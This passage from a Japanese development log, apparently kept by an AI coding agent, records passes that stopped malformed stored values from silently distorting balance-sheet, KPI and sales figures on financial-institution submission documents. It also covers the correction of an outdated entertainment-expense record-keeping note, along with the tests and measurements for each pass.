が「取得価格が読めない 1 件は表面利回りの平均から外しています」と、**どちらも原因を正しく述べる** (パス 54 / 187) ③ **ただし `monthlyExpenses` / `monthlyLoan` は黙って 0 へ倒れる** —— 実測で月次キャッシュフローが ￥70,000 → ￥80,000 / ￥90,000 と**過大**に出て断りは 0 文 (画面だけで紙には届かない。**次のパスの候補として `docs/REMAINING_WORK.md` に測って残した**) ④ **`applyOverrides` の `ignored` は誰も読んでいない** —— 非数の上書きは正しく捨てられるが、捨てたことを告げる面が 0 件 (同じく残した)。`typecheck` 緑・`npm test` **865 / 18,764**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15597 → **15609** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 253 ms / heap 10.3 MB・FULL DCL 742 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **41 回目**でもあり、今回も再現しなかった))・— **2026-09-24 パス 444 後の計測: 11,957,713 B / 3,370,232 B (両方 +3,346 B** —— 数の欄の表 (10 行・日本語のラベルつき)・倒した先ごとの名簿・原因ごとの断り 2 文・溜まりの欄を分ける口 1 つ・4 つの面の配線。**ラベルは docblock ではなく値**なので最小化で落ちない。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**貸借対照表の欄が数として読めないと黙って 0 へ倒れ、健全な会社の紙が「自己資本比率 △100.0%（債務超過）」を名乗っていた。** **見つけ方**: パス 442 が docblock に測って書いた死角 (「**投げない嘘** —— `Intl` の `format`」) の残りを**面の側から数えた** —— 保管値を素で数として扱う欄は **14 collection / 72 欄**で、販売記録 2 欄 (パス 442) と KPI 10 欄 (パス 443) は閉じている。次に重いのが貸借対照表だった。`normalizeBalanceSheet` は**型から読む**ので投げも連結もしない —— 代わりに**倒す**。実測 (2026-09-24 · 直す前 · 健全な控え = 自己資本比率 33.3% / 流動比率 160.0% · 金融機関等提出用の書面 §4):

| 壊した欄 | 総資産 | 純資産 | 自己資本比率 | 流動比率 | 紙の但し書き |
| --- | ---: | ---: | ---: | ---: | --- |
| (正しい控え) | 12,000 千円 | 4,000 | 33.3% | 160.0% | —— |
| **`currentAssets`** | 4,000 | **△4,000** | **△100.0%** | **0.0%** | **無し** |
| **`fixedAssets`** | 8,000 | **0** | **0.0%** | 160.0% | **無し** |

★ **`'9000000'` / `{z:1}` / `[1]` / `true` / `null` の 5 形すべてで同じ**で、どの形でも理由を 1 文も述べない。★ **向きがパス 443 と逆である** —— あちらは 10 兆円の営業利益で**過大**に見せ、こちらは**健全な会社を債務超過として過小**に見せる。どちらの紙も「上記のとおり相違ありません。」と代表者名つきで金融機関へ出す。★ **2 つ目 —— 任意の欄は「原因を取り違えた断り」になっていた** (こちらのほうが起きやすい)。任意の欄 (棚卸資産・売上債権・仕入債務) は `undefined` へ倒れるので、既存の **3 つの面がそろって「未入力のため」**と述べる (実測: `inventory: '500'` で 書面 §5 / 経営ハイライト / 経営サマリーの画面)。**打ち込んだ利用者にとって偽**で、しかも経営ハイライトは「**KPI ページの貸借対照表に入力してください**」と**直す手まで名指しする** —— パス 388 の形 (原因を取り違えた断りは直す手ごと誤らせる) である。**直し**: ① 名簿は**倒した先で 2 つに分ける** (`UnreadableBalanceSheetFields {zeroed, missing}`) —— **倒した先が違えば断りの文も直す手も違う**ので、1 つの配列に畳むと「0 円として計算しています」が任意の欄にも掛かって読める (実際は算定していない) ② **数の欄の表は 1 つ** (`BS_NUMERIC_FIELDS`) —— 倒す側と報告する側を別々に書くと、11 個目の欄が足された日に**倒すのに報告しない欄**ができる ③ **未入力は名簿に入れない** (`r[f.key] === undefined` は「読めなかった」ではない —— 数えると「入力してください」しか言えない利用者に「読めません」と言う) ④ 4 つの面が述べる (書面 §4 の caption・書面 §5 は**原因を 2 文に分ける**・経営ハイライトは**読めない側で「入力してください」と言わない**・経営サマリーの画面は `role="alert"` + 逃げ口を名指し) ⑤ **値は 1 つも変えていない** —— 倒し込みを外すと形の表が拒む行を復元が**行ごと**落とし、貸借対照表は 1 件しか無いので紙全体が「未入力」になる (パス 227 の `defaultBandNote` と同じ判断)。★ **正しい控えの答えは 1 つも変わらない** (実測: §4 は 12,000 / 4,000 / 33.3% / 160.0% のまま・caption も `null` のまま)。★ **機械は 2 層** —— `renderer/data/__tests__/unreadableBalanceSheetFields.test.ts` (**31 件**) が母集団を**形から振る舞いで導く** (「この欄に 0 を入れてよいか」= 数の欄 /「この欄は無くてよいか」= 任意) ので、表と形の過不足も `required` の食い違いも両方向で鳴る。背骨は `renderer/pages/__tests__/storedBalanceSheetReads.test.ts` (**9 件**) で、実物の保管層へ入れて実物の画面を描く。★ **母集団の probe を 1 度直した** —— 最初は `GOOD_RAW` を土台に `{[key]: 0}` を置いたが、**「内数 ≦ 親項目」(`recordRelations.ts`) が先に鳴る**ので `currentAssets: 0` が拒まれ、それを「数の欄ではない」と読み違えて流動資産と流動負債を母集団から落としていた。全部 0 の素の控えを土台にして直した。対照 **10 方向すべて鳴り、それぞれ狙った検査に当たる** (A 名簿を作らない ❌28 (**欠陥がそのまま再現**) / B 書面 §4 の断りを外す ❌6 / C 書面 §5 を 1 文へ戻す ❌1 / D ハイライトを 1 つへ戻す ❌3 (**3 ファイル** —— 画面はハイライトも描くので jsdom にも当たる) / E レポートの断りを外す ❌1 / F 画面の断りを消す ❌6 / G 画面の溜まりの断りを 1 文へ戻す ❌1 / H 任意の欄も `zeroed` に入れる ❌9 / I 欄の無い控えも「読めなかった」に数える ❌4 / J census の台帳から 1 行消す ❌1・復帰後 ❌0)。★ **自戒: 対照 D は 1 度目 `Tests no tests` と出た** —— 私の python の置換が括弧を壊してファイルが読み込めなくなっていた (**「検査が 0 件」は緑ではない** · パス 409 / 412 で 2 度書いた当のこと)。正確に当て直すと ❌3 で鳴る。★ **既存の対照 1 件を、主張を緩めずに直した** —— `balanceSheet.test.ts` の「対照: 揃った控えは 1 つも書き換えない」は `toEqual(full)` で、名簿の欄が増えると落ちる。`const { unreadableFields, ...values }` で**名簿を外して元の主張をそのまま当て**、名簿が空であることを**別に**主張する形にした (畳むと「名簿さえ空なら値は何でもよい」になる)。★ **測って何も無かった軸も記録する**: ① **`netIncome` を壊しても §4 の 4 行は動かない** (ROA / ROE にだけ効く) が、名簿には載るので紙は述べる ② **画面は `pct` を `digits` 無しで呼ぶので丸めない** —— `160.0%` ではなく `160%`・`△100.0%` ではなく `-100%` (書面の `△` は書面側の整形)。検査の期待値をそこで 1 度外した ③ **`missingStocks` を読む面は 3 つで全部直した** (書面 §5 / 経営ハイライト / 経営サマリーの画面)。`typecheck` 緑・`npm test` **864 / 18,732**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15577 → **15597** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 270 ms / heap 10.3 MB・FULL DCL 775 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **40 回目**でもあり、今回も再現しなかった))・— **2026-09-24 パス 443 後の計測: 11,954,367 B / 3,366,886 B (両方 +1,157 B** —— 漏斗が金額も見る分岐・原因ごとの断り 3 文 (日本語)・画面が型から読む口 1 つと壊れた行の導出値を抑える 1 行。増分の大半はその 3 文である。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**KPI の金額が 10 進の文字列だと、金融機関等提出用の書面が「営業利益 10,000,007,880 千円 / 営業利益率 100.0%」を刷っていた。** **見つけ方**: パス 442 が残した次の問い —— 「投げない嘘」の残り (`KpiPage` の `yen.format(r.data.revenue)`) —— を**測ってから**判定した。`readablePeriodRows` (パス 225) は**期しか見ず**、`summarizeFundamentals` は `acc.revenue + a.revenue` と**素で足す**ので、JS の `+` の規則がそのまま紙の数字になる。実測 (2026-09-24 · 直す前 · 正しい 1 件 (revenue 100 万) + 金額だけ壊した 1 件):

| revenue | 書面 §1 売上高 | 書面 §1 営業利益 | 営業利益率 | 損益分岐点 |
| --- | ---: | ---: | ---: | ---: |
| (正しい 2 行) | 2,000 千円 | 880 千円 | 44.0% | 646 千円 |
| **`'9000000'` (10 進の文字列)** | **―** | **10,000,007,880 千円** | **100.0%** | **420 千円** |
| `[1]` | **―** | **8,880 千円** | **88.8%** | **451 千円** |
| `true` | **1,000 千円** | **△119 千円** | **△12.0%** | **1,399 千円** |
| `null` | **1,000 千円** | **△120 千円** | **△12.0%** | **1,400 千円** |
| `{z:1}` | ― | ― | ― | ― |

★ **5 形すべてが誤った紙を作り、5 形とも理由を 1 文も述べなかった。** ★ **10 進の文字列がいちばん重く、しかも形が歪んでいる** —— `1_000_000 + '9000000'` は**連結** (`'10000009000000'`) なので売上高は `Number.isFinite` の床に当たって `―` になる一方、`revenue - cost` は**数に戻る**ので営業利益だけが刷られる。**売上高が空欄の紙に営業利益 10 兆円と営業利益率 100.0% が並び、その紙は「上記のとおり相違ありません。」と代表者名つきで金融機関へ出す。** ★ **`null` と `true` はもっと静か** —— `1_000_000 + null === 1_000_000` なので**壊れた行が黙って 0 円として合算され**、どの面にも痕跡が残らない。★ **`{z:1}` だけは全部 `―` になるが、そのとき出る但し書きは「対象期間の売上高が 0 のため」で原因が違う** (パス 388 の家系) —— 利用者は「売上を入れろ」と読むが、直すべきは壊れた 1 行を消すことである。★ **走査には構造的に映らない** —— `Intl.NumberFormat#format` は**何を渡しても投げない**ので、パス 441 / 442 の `audit:malformed-fields` (投げた画面を数える) には 1 件も出ない。パス 442 がその死角を docblock に測って書いた当のものである。**直し**: ① 漏斗を `readableKpiRows` として置く —— `readablePeriodRows` は**名前どおり期だけを見るまま残し** (58 か所の参照と 3 つの記録がその名で指している)、期の漏斗 + 金額の漏斗を合成した新しい名前を 9 つの呼び手が通る ② **合計に入る欄は手書きしない** —— `KPI_SUM_FIELDS = Object.keys(summarizeFundamentals([]))` で、6 つ目の欄が `KpiFundamentals` に足された日に自動で伸びる (対照 H がその 1 件だけを鳴らす) ③ **人件費は任意なので、在るときだけ検める** —— 入口 `parseKpiActual` の `input.laborCost != null && …` と**同じ境目**にする (揃えないと「入口は通すのに読みが落とす」非対称になる) ④ **原因ごとに断りを分ける** (`unreadableNumberNote` / `…SheetNote` + 3 面の joiner)。期が崩れた行と金額が崩れた行は**別々に在りうる**ので、1 文に畳むと**その人がしていない失敗**を告げる ⑤ **逃げ口は期の側と別** —— 金額が非数の行は**形の表 (`revenue: num`) が断る**ので設定の点検パネルが見つける。期 (`period: str`) は形を通るので一覧の × が逃げ口である。**同じ画面の 2 つの文が別の逃げ口を名乗るのは、行の届き方が違うから** ⑥ 画面は型から読み (`kpiAmountText`)、**壊れた行の導出値も出さない** (売上高を「—」と言いながら営業利益に確信のある数字を並べると、同じ行が同じ問いに 2 通り答える)。★ **正しい控えの答えは 1 つも変わらない** (実測: 書面 §1 は 2,000 / 880 / 44.0% / 646 のまま・caption も 1 字も増えない)。★ **機械は 2 層** —— `renderer/data/__tests__/unreadableKpiAmounts.test.ts` (**28 件**) が母集団を `summarizeFundamentals` の出力から導いて**5 欄 × 5 形**を掛け、原因の言い分けを**両方向**に留め、書面・レポート・経営サマリーの 3 面を実際に組む。背骨は `renderer/pages/__tests__/storedKpiAmountReads.test.ts` (**9 件**) で、実物の保管層へ入れて実物の画面を描く。★ **直す前の嘘は算術で残す** (製品は直したので再現できない) —— 素の `+` が 5 形をどう畳んでいたかと、**`Intl` がどの形でも投げないこと**を標本にした。対照 **9 方向すべて鳴り、それぞれ狙った検査に当たる** (A 漏斗を期だけへ戻す ❌17 (**欠陥がそのまま再現**) / B 金額の断りを期の文面へ畳む ❌9 (**言い分けの両方向 + 画面**) / C 書面が述べない ❌1 / D レポートが述べない ❌1 / E 経営サマリーが件数を 0 と言う ❌4 / F 一覧の金額を素へ戻す ❌2 / G 壊れた行の導出値も出す ❌1 / H 合計の欄を手書きへ ❌1 / I 人件費を必須扱い ❌14・復帰後 ❌0)。★ **自戒: 対照 G が 1 度目に鳴らず、原因は私の検査の針だった** —— 「導出値も出さない」を `not.toContain('-￥')` で書いたが、それは**直す前の実測が `revenue: '1000'` で −559,000 だった**ことに引きずられた符号の主張で、検査の標本 `'9000000'` では `'09000000' - 560000 = +8,440,000` と**正**になる。**符号は欠陥の性質ではない。** 行の `<td>` そのものを読む形に直すと G は ❌1 で鳴る (F も ❌1 → ❌2 へ増えた)。**鳴らない対照は合格ではなく、その検査についての報せである** —— 規約どおり対照を回していなければ、この検査は「導出値の抑止」を 1 度も守らないまま出荷されていた。★ **ゲートが 2 つ捕まえた**: ① `absenceSampleCensus` —— 私が `not.toMatch(/…/)` を**リテラルのまま**書いた 2 件に標本が無かった (**CLAUDE.md の規約そのもの**)。針を定数へ出し、同じ `it` の中で**その針が当たる標本**も主張する形に直した ② `verify:arch` のユニットテスト数を 15555 → **15577** へ (**今回も予想せず門に訊いた**)。★ **測って何も無かった軸も記録する**: ① **`unreadablePeriodRows` の名前は変えない** —— 実物の参照は 58 か所で、そのうち `docs/SESSION_HANDOFF.md` / `docs/REMAINING_WORK.md` はパス 225 / 392 / 393 / 400 の**記録**である。名前を変えると記録が指す先を失うか、履歴を書き換えることになる。**期の漏斗は今も期だけを見る**ので、その名前は今日も真である ② **`laborCost` は落とす側に倒した** —— 形が `opt(num)` と宣言するので「在って数でない」は形が拒む行であり、**落として述べる**のがこのリポジトリの既定である (黙って 0 にすると `blank-states-its-reason` を破る) ③ **`kessanImport` / `docImports` も同じ漏斗を通る** —— 計算書類と事業計画書は同じ `input.kpiActuals` を読むので、パス 393 が閉じた「読めない期の行を合算する」の**金額版**も同時に閉じた。`typecheck` 緑・`npm test` **862 / 18,692**・`verify:all` exit 0。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 235 ms / heap 10.3 MB・FULL DCL 729 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **39 回目**でもあり、今回も再現しなかった))・— **2026-09-24 パス 442 後の計測: 11,953,210 B / 3,365,729 B (両方 +1,261 B** —— 保管した事業名を型から読む口 1 つ・売上と相談の 4 つの `<td>`・金額の床 1 つ・漏斗が数も見る分岐・**読めない金額の断り 2 文 (日本語)**。増分の大半はその 2 文である。`renderer/` は両ビルドが読むので LITE も同じだけ増える。**保管した金額が 10 進の文字列だと、売上高が 5,000 倍になって金融機関等提出用の書面に載っていた。** **見つけ方**: パス 441 の走査を **6 形**へ広げて初めて通した (`組 726 × 画面 74 = 53,724 回の描画`)。**投げた画面 4 件** —— どれも**物を React の子として素で置いた**形で、2 形の標本では構造的に届かなかった (数と文字列は `.trim` / `.toFixed` を落とすが、物と配列は JSX が落とす。**配列は落ちない** —— React は `[1]` を子の一覧として描く):

```
business-units.name       (obj) → overview
sales-entries.date        (obj) → sales
sales-entries.orders      (obj) → sales
shigyo-consultations.date (obj) → tax-accountant
```

★ **走査に映らなかった 2 件を、読んで見つけた —— どちらも走査より重い。** ① **並べ替えは 5 形すべてで投げる** —— `sortBusinessUnits` の `a.data.name.localeCompare(...)` は **`Array.prototype.sort` が要素 1 つでは比較関数を呼ばない**ので、1 行だけ置く走査からは**構造的に見えなかった**。2 行置くと実測で `42` / `{z:1}` / `[1]` / `true` / `null` の**全部**が TypeError。ここが投げると重いのは `ManualDataSection` が **`App.tsx` の側から目録を持つ全画面に描かれる**ためで、1 行の壊れた事業登録で**その画面すべてが開けなくなる** (法則 `escape-hatch-stays-open`)。② **金額は投げずに嘘を刷る** —— `Intl.NumberFormat#format` は何を渡しても投げないので「投げた画面」の網に掛からない。実測 (2026-09-24 · 直す前 · 正しい 1,000 円の行 1 件と、金額だけ壊した行 1 件):

| 保管した `amount` | `totalAmount` | 画面と書面が刷る額 |
| --- | --- | ---: |
| `'1000'` (**10 進の文字列**) | `"10001000"` | **￥10,001,000 (5,000 倍)** |
| `[1]` | `"10001"` | ￥10,001 |
| `{z:1}` | `"1000[object Object]"` | `￥NaN` |
| `true` | `1001` | ￥1,001 |
| `null` | `1000` | ￥1,000 (**その行を 0 円として黙って数える**) |

★ **文字列の場合がいちばん重い** —— JS の `+` が文字列連結に落ちるためで、10 進の文字列は手で直した JSON や古い取り込みが普通に作る形である。しかも**桁が跳ね上がる向き**に外れ、この数は `summarizeSales` → 経営サマリー → **金融機関等提出用の書面 §2「売上高（販売記録）」**へそのまま載る (その紙は「上記のとおり相違ありません。」で代表者名つきで終わる)。★ **`null` は逆向きに外れる** —— 0 円として黙って数えるので売上高が小さく出る (パス 395 が「0 を事実の主張として刷らない」と決めた当の形)。★ **`readableSalesRows` は日付しか見ていなかった** —— パス 360 が置き パス 400 が合計へ通した漏斗で、そこに金額の読みは無かった。**直し**: ① 漏斗が `finiteNumberOf` で金額・受注件数も見て、読めない行は**落とす** (読めない額は 0 でも合計でもない) ② **原因は日付と別に数える** —— 「日付が読めない」と言われた利用者は日付を直しに行くので、原因を取り違えた断りは**直す手ごと誤らせる** (パス 388)。`unreadableSalesAmountNote` / `…SheetNote` を足し、`droppedSalesRowsNote` / `…SheetNote` が**出る文だけ**を並べる ③ 画面は型から読む (`displayField` / `finiteNumberOf`) ④ **読める行が 1 件も無いときの売上集計のタイルは `—`** —— 空集合の和は算術としては 0 だが「総売上 ￥0」は*売れていない*という**事実の主張**として読める。パス 395 が書面 §2 と経営サマリーについて下した判断と同じで、**この画面のタイルだけが残っていた**。**手で置いた値は消さない** (パス 382 の `overridden` を読む)・**一覧は畳まない** (× で消せる逃げ口を閉じない・パス 425)。★ **読める値の答えは 1 つも変わらない** (実測: 良い行だけなら合計・件数・単価・期間がすべて一致)。★ **機械は 2 層** —— `renderer/__tests__/storedRowFieldRenders.test.ts` (**63 件**) の背骨は**振る舞い**で、実物の保管層へ入れて実物の画面を描く。加えて漏斗の算術 (内訳の合計 = 落とした件数)・原因の言い分け (**両方向**: 金額だけの利用者に「日付」と言わない / その逆も)・走査 (`businessUnits.ts` に素の `.data.name` が 0 件・**針が的に当たる標本つき**) を持つ。対照 **9 方向すべて鳴り、それぞれ狙った検査に当たる** (A 素の `.data.name` へ戻す ❌16 (**並べ替え 5 形 + label 5 形 + 振る舞い + 走査**) / B 売上の日付を素へ ❌1 / C 受注件数を素へ ❌1 / D 相談の日付を素へ ❌1 / E 漏斗を日付だけへ ❌13 / F 金額の断りを日付の文面へ畳む ❌2 (**言い分けの両方向**) / G タイルを素の 0 へ ❌4 / H 空欄の原因を日付だけで決める ❌1 / I 金額の床を外す ❌2・復帰後 **63 / 63**)。★ **自戒: 対照 D が 1 度目に鳴らず、錠が「画面のラベル」だった** —— `'税理士'` は見出しなので保管層より先に出る。行が届く前の姿を測っており、**その `it` は直す前でも直した後でも通る空の検査だった**。同じ罠を**同じパスの中で 2 度**踏み (経営サマリーの錠も `'経営サマリー'` だった)、どちらも**その `it` が置いた行にしか無い印**へ移して鳴らせた (パス 376 / 390 で 2 度書いた当のこと)。★ **ゲートが 2 つ捕まえた**: ① `zeroFoldCensus` —— 私が `? … : 0` を 2 つ書いたので母集団が 276 → 278 になった。どちらも**到達しない防御の倒し込み** (計数器は必ず整数) なので、再生成ではなく**真偽で組み直して**消した (法則 `no-zero-fold`・パス 435 と同じ向き) ② `namedEscapeHatchReachable` —— 新しい断りが「形式の合わないレコード」を名指しするので「台帳に書け」と鳴った (**設計どおり**)。理由と標本つきで登録した。★ **測って何も無かった軸も記録する**: ① **`TeamPage` の `{r.data.role}` は `<select value=…>`** なので React が属性へ文字列化する —— 投げない (走査が正しく黙っていた) ② **`ManualDataSection` の `{u.data.startedOn}`** は直前の `typeof === 'string'` が守る ③ **書き込みの結果 (`res.data.*`) を素で描く 17 か所**はパス 414 が `parseCreatedX` で閉じており、保管値ではない ④ **`findBusinessName` の返り値は `displayField` を通ってから描かれる**ので、宣言の型を直したのは罠の除去である。`typecheck` 緑・`npm test` **860 / 18,655**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15544 → **15555** へ (**今回も予想せず門に訊いた**)。**走査の母集団も広げ、直した後にもう 1 度完走させた** —— 良い行 1 件を先に置き、壊れた行を後に置く (`comparefn(arr[1], arr[0])` から始まるので、壊れた行が比較関数の左に立つ)。実測: 同じ `組 726 × 画面 74 = 53,724 回の描画`で **投げた画面 0**・**単独で 1 時間弱** (`npm test` もビルドも並行させていない —— パス 441 が worker を失った条件を避けた)。**それでも見えない家系は残る**ので走査の docblock に測って書いた: **`App.tsx` が描く部品** (単独 mount には載らない・パス 419 が同じ死角を記録している) と **投げない嘘** (`Intl` の `format`)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 251 ms / heap 10.3 MB・FULL DCL 754 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **38 回目**でもあり、今回も再現しなかった)**)・— **2026-09-24 パス 441 後の計測: 11,951,949 B / 3,364,468 B (両方 +128 B** —— 保管した事業名を型から読む口 1 つと、画面の 4 つの `<td>` / 2 つの文面に天井を通した分。`renderer/` は両ビルドが読むので LITE も同じだけ増える。**保管した事業名に素で `.trim()` を呼んでおり、非文字列 1 件で KPI / BEP と経営サマリーの両方が開けなくなっていた。** **見つけ方は人ではなく道具である** —— パス 419 が残作業として書いた「欄ごとに 1 つずつ壊す全面走査」を**定期点検の道具の 6 本目** `npm run audit:malformed-fields` にしたら、**初回実行が 3 件見つけた**:

```
kpi-actuals.unit (num) → kpi:      TypeError: a.unit.trim is not a function
kpi-actuals.unit (num) → overview: TypeError: a.unit.trim is not a function
kpi-budgets.unit (num) → kpi:      TypeError: a.unit.trim is not a function
```

★ **その残作業の記録そのものが誤っていた** —— 節は母集団を **281 通り**と書き、「**正しい日付 + 1 欄だけ壊れている**という一番現実的な形がどの家系にも無い」を覆うために在った。実測すると **281 は「空の行に 1 欄だけ置いた」組の数** (143 欄 × 2 方向 = 286 のうち形が受ける 5 組を引いた数) で、**正しい行**の上で 1 欄だけ壊すと **175 通り**にしかならない。空の行は他の必須の欄を全部欠いているので**読む側の漏斗が読む前に落とす** —— 実測 (`readableSalesRows` に直接食わせる): `{note: 42}` は残り **0** / `{…正しい販売記録, note: 42}` は残り **1**。**覆うために書かれた走査が、覆うはずだった形をそのまま外していた** (法則 `measure-before-claim`)。あの「投げた画面 0」は、この形についての証拠ではなかった。★ **画面の数も誤っていた** —— 記録は「× 76 画面」と書くが `SERVICES` は **74 件** (サービスは 76 だが `uber-eats` / `demae-can` はサイドバーの項目を持たない · CLAUDE.md 冒頭)。直した走査の初回実測は **175 組 × 74 画面 = 12,950 回の描画**である。★ **届く先は 3 つの描画** —— `KpiPage.tsx:389` (実績パネル) / `KpiPage.tsx:633` (予算パネル) / `OverviewPage.tsx:787` → `overview.ts:423` (`buildBusinessOverview`)。つまり **KPI / BEP と経営サマリーの両方が開けなくなり、開けない画面からその行は消せない** (法則 `escape-hatch-stays-open`)。`readablePeriodRows` (パス 225) は**期**しか見ないので、この値は選別を通り抜ける。**直しはパス 417 と同じ形** —— 読みを 1 つの口 `kpiUnitText` (型から始めて trim する) へ寄せ、画面に出す所は `displayField(…, MAX_KPI_UNIT_CHARS)` (**入口が既に持つ数**なので正当な事業名は 1 字も変わらない) を通す。★ **天井は同一性の側に通さない** —— `actualKey` は (期, 事業) の同一性を決めるので、切った事業名は**別の事業を指す**。★ **`kpiPeriodText` は罠の除去であって今日の欠陥ではない (測った)** —— 呼び手 3 つはどれも `readablePeriodRows` を通すので非文字列の期は届かない (実測: `period: 42` を 2 件置いても投げない)。それでも閉じたのは、同じ関数の中で `unit` は型から読み `period` だけが素という**非対称**が残ると、4 つ目の呼び手が増えた日に `x.period.localeCompare is not a function` で静かに開くから (パス 398 と同じ位置づけ)。**鍵には通さない** —— そこで両方を `''` へ倒すと、別々の行を「同じ期・事業が 2 件」と**無い重複を主張する**。★ **2 形では足りないことも測った** —— `.trim` / `.toFixed` を落とすのは数と文字列だが、**物と配列は JSX が「Objects are not valid as a React child」で落とし**、`null` は `??` を通り抜けた先で `.trim` を落とす。`ONE_FIELD_VALUES` を **6 形**へ広げた (どれも `structuredClone` が通すので保管値として実在しうる)。★ **道具は `npm test` に置かない** —— `vitest.audit.config.ts` だけが `src/**/__audits__/**/*.audit.ts` を拾う (既定の `include` の外なので `npm test` は今までどおり)。契約は `renderer/__tests__/oneFieldMalformed.test.ts` (6 件) が毎回留める。★ **写しを作らずに出した共有モジュール 2 つ** —— `data/__tests__/collectionSamples.ts` (正しい標本・パス 439 の両方向の台帳が縛る) と `__tests__/pageRenderHarness.ts` (jsdom の足場と「素で描いて投げたら理由を返す」・`malformedStoreRenders.test.ts` と同じ 1 つ)。★ **ゲートが 3 つ、私の新しいファイルを捕まえた —— どれも設計どおり**: ① `lint:forbidden` が走査の子プロセス (`spawnSync`) を台帳の無い例外として鳴らした (理由つきで登録) ② `rootConfigScanned` (パス 347) が `vitest.audit.config.ts` を「直下のコードなのに `SCAN_FILES` に無い」と鳴らした (`SCAN_FILES` / `MUST_SCAN` / 整合性チェーンの 3 つへ・block **#257**) ③ `typecheckCoverage` (パス 278) の母集団に入るので `tsconfig.node.json` の include へ (CLAUDE.md のこの写しも直した)。★ **`deviceStoreWritePolicy` の台帳は `__audits__/` を `__tests__/` と同じく外した** —— この台帳が見るのは**製品の書き込み口**で、道具の書き込みを報せる画面は存在しない。検査は `renderer/pages/__tests__/storedKpiUnitReads.test.ts` (**25 件**・背骨は振る舞いで実物の保管層へ入れて実物の画面を描く)。`typecheck` 緑・`npm test` **859 / 18,592**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15532 → **15544** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 248 ms / heap 10.3 MB・FULL DCL 729 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **37 回目**でもあり、今回も再現しなかった)。★ **6 形の全走査だけは完走していない** —— 25 分ほど走った所で vitest の worker が居なくなり親だけが待ち続けた (同時に `npm test` と両ビルドを走らせていたのでメモリの奪い合いと見ているが**確かめていないので断定しない**)。`docs/REMAINING_WORK.md` に「**6 形での『投げた画面 0』はまだ誰も見ていない**」と残し、単独で回すよう書いた)・**2026-09-24 パス 440 後の計測: 11,951,821 B / 3,364,340 B (両方 +401 B** —— 経費精算書の注意書き 1 文を、法定の要件どおりに書き直した分。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**記録の義務に、アプリが勝手な金額の下限を付けていた。** **見つけ方**: パス 438 の形 (「その文が名乗る数が、その利用者にとって真か」) を**書式の注意書き**へ当てた —— 法定の数値を名乗る文を全部拾い、その数がどこから来たかを問うた。実測 (2026-09-24 · 直す前):

| | |
| --- | --- |
| 経費精算書の注意書き | 「**3万円以上**の交際費・会議費については、参加者の氏名・人数・**目的**の記録を残してください。」 |
| 実際の規則 (租税特別措置法61条の4) | 飲食費を交際費等から除外する特例の適用には**金額の大小にかかわらず**書類の保存が要る |
| 実際の基準額 | **1 人当たり 1 万円**以下 (2024-04-01 以後の支出。それ以前は 5,000 円) |
| 「3 万円」の出どころ | **廃止された**消費税法30条7項ただし書 (3 万円未満は帳簿のみで仕入税額控除)。インボイス制度の開始 (2023-10-01) で無くなっている |

★ **向きが利用者の損である** —— 保存は**除外の条件**なので、1 人 8,000 円の会食で「3 万円未満だから記録は要らない」と読んだ利用者は、**その飲食費を交際費等から除外できなくなる**。交際費等は資本金 1 億円超の法人で 50% 損金不算入 (100 億円超は全額)、中小法人でも年 800 万円の定額控除枠を食う。**記録を減らす側に誤っていた。** ★ **アプリ自身が正しい規則を持っていた** —— 確証つきコーパス `complianceKnowledge.ts` の `tax-entertainment-expense-meal-threshold` (出典は国税庁タックスアンサー No.5265 と中小企業庁) が「1 人当たり 10,000 円以下へ引上げ」と「飲食年月日・参加者の氏名/関係/人数・費用額・店名所在地等を記載した書類の保存が必要」を**両方**述べている。**2 つの法知識が矛盾していて、出典を持たない側が画面に出ていた。** ★ **同じ note 配列の 2 行上は 3 万円を正しく使っている** —— 「3万円未満の公共交通機関による旅客の運送（公共交通機関特例）」。こちらは**義務を免除する側**の下限で今も生きている。**同じ配列の中で、同じ数が一方では正しく、他方では廃止された規則から来ていた** (パス 438 の「同じ studio の他は正しい」と同じ非対称)。★ **記載事項も食い違っていた** —— 直す前は「氏名・人数・目的」の 3 つで、**年月日・金額・店名・所在地が無く**、しかも「目的」は法定事項ではない (施行規則21条の18の4)。**この文に従って記録しても、除外は受けられない。** **直し**: ① 注意書きを法定の要件どおりに書き直す (基準額・社内飲食費の除外・「金額の大小にかかわらず」・法定の記載事項・根拠条文・**超えたら全額が交際費等**) ② 機械を 2 層。★ **基準額はコーパスから導く (数を 2 度書かない)** —— `renderer/data/__tests__/recordKeepingFloor.test.ts` (**9 件**) が `VERIFIED_COMPLIANCE` の statement から今の基準額を読み、注意書きが名乗る額と突き合わせる (「1万」と「10,000」は同じ数へ正規化する)。導けなければ**読んだ文を刷って落ちる** (fail closed・対照 B)。★ **母集団は原文の走査** —— 記録・保存の義務を述べる文 (**実測 48 件**) のうち「**N 円以上**」で義務を始める文が **0 件**であることを両方向で留める。**下限が正当に出るのは義務を免除する側だけ** (公共交通機関特例の「3万円未満」は緩和であって義務の開始点ではない) ——その 1 件も別に主張する。**針が的に当たること**は**直す前の文そのもの**を標本にして示した (規約「不在の主張には標本を添える」)。対照 **5 方向すべて鳴り、それぞれ狙った検査に当たる** (A 注意書きを直す前へ戻す ❌5 (**欠陥がそのまま再現し、走査が `docStudioData.ts:2362` を名指しする**) / B コーパスの言い回しを変える ❌1 (**読んだ文を刷って落ちる**) / C 針を殺す ❌2 